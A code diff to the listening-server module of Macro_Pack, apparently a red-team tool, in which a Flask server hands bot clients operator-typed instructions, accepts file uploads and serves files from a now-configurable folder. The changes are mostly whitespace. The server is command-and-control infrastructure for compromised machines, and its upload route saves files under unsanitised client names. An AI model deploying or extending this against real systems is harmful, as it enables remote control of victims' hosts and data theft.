@@ -42,7 +42,7 @@ def index():
 @secure_http_response
 def query():
     """ called by client to ask for instruction """
-    
+
     # Send request to bot if any pending
     clientId = request.form['id']
     pendingInstruction = input(" %s >> " % clientId)
@@ -73,51 +73,50 @@ def answer():
 # This is the path to the upload directory
 webapp.config['UPLOAD_FOLDER'] = '.'
 
-
 # Route that will process the file upload
 @webapp.route('/u', methods=['POST'])
 @secure_http_response
 def upload():
     # Get the name of the uploaded file
     file = request.files['uploadfile']
-    if file: 
+    if file:
         filename = file.filename
         logging.info("   [-] Uploaded: "+ filename)
         file.save(os.path.join(webapp.config['UPLOAD_FOLDER'], filename))
         return make_response("OK")
-    
+
 
 @webapp.route('/u/<path:filename>', methods=['GET', 'POST'])
 @secure_http_response
 def download(filename):
-    
-    uploads = os.path.dirname(getRunningApp()) 
+
+    uploads = os.path.dirname(getRunningApp())
     logging.info("   [-] Sending file: %s" % (os.path.join(uploads,filename)))
     return send_from_directory(directory=uploads, filename=filename)
 
- 
+
 
 class ListenServer(MpModule):
 
 
     def __init__(self, mpSession):
         self.listenPort = mpSession.listenPort
+        self.listenRoot = mpSession.listenRoot
+        webapp.config['UPLOAD_FOLDER'] = mpSession.listenRoot
         MpModule.__init__(self, mpSession)
-    
+
     def run(self):
         """ Starts listening server"""
 
         logging.info (" [+] Starting Macro_Pack web server...")
         log = logging.getLogger('werkzeug')
         log.setLevel(logging.ERROR) # Disable flask log if easier to debug
-        logging.info ("   [-] Files in current folder are accessible using http://<hostname>:%s/u/" % self.listenPort)
+        logging.info ("   [-] Files in \"" + self.listenRoot + "\" folder are accessible using http://<hostname>:%s/u/" % self.listenPort)
         logging.info ("   [-] Listening on port %s (ctrl-c to exit)..." % self.listenPort)
-        
+
         # Run web server in another thread
         webapp.run(
             host="0.0.0.0",
             port=int(self.listenPort),
             #ssl_context=context
         )
-
-
